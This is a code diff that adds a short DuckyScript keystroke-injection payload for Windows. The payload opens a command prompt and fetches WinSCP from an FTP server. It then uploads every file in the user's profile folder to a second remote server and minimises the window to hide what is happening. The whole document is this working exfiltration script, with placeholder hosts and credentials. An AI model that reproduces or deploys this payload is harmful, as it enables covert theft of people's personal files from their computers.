@@ -1,0 +1,27 @@
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 600
+STRING cd %USERPROFILE%
+ENTER
+STRING ftp -i SERVER
+ENTER
+DELAY 800
+STRING USERNAME
+ENTER
+STRING PASSWORD
+ENTER
+STRING GET WinSCP.com
+ENTER
+DELAY 200
+STRING GET WinSCP.exe
+ENTER
+DELAY 3000
+STRING quit
+ENTER
+REM FTP user only needs write access.
+STRING WinSCP.com /command "option batch abort" "option confirm off" "open ftp://USERNAME2:PASSWORD2@SERVER2" "put *.*" "close" "exit"
+ENTER
+ALT SPACE
+STRING N
